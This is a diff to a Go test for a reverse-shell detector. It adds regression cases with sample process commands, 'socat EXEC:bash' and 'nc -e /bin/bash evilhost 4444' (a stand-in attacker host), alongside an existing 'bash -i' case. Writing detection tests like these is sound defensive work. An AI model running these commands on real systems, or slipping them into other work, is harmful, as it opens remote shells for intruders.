@@ -97,6 +97,23 @@ func TestDetectReverseShells(t *testing.T) {
 			wantCount: 1,
 		},
 		{
+			// Regression: socat/EXEC: carry no sock/tcp/udp/IP/host:port token,
+			// so the network gate would miss them — but they are unambiguous
+			// tools and must fire regardless (code-review #842).
+			name: "socat exec with no network token stays detected",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `socat EXEC:bash`},
+			},
+			wantCount: 1,
+		},
+		{
+			name: "nc -e with hostname (no dotted IP) stays detected",
+			processes: []Process{
+				{PID: 1234, User: "1000", Command: `nc -e /bin/bash evilhost 4444`},
+			},
+			wantCount: 1,
+		},
+		{
 			name: "interactive bash shell flagged regardless of network indicator",
 			processes: []Process{
 				{PID: 1234, User: "1000", Command: `bash -i`},
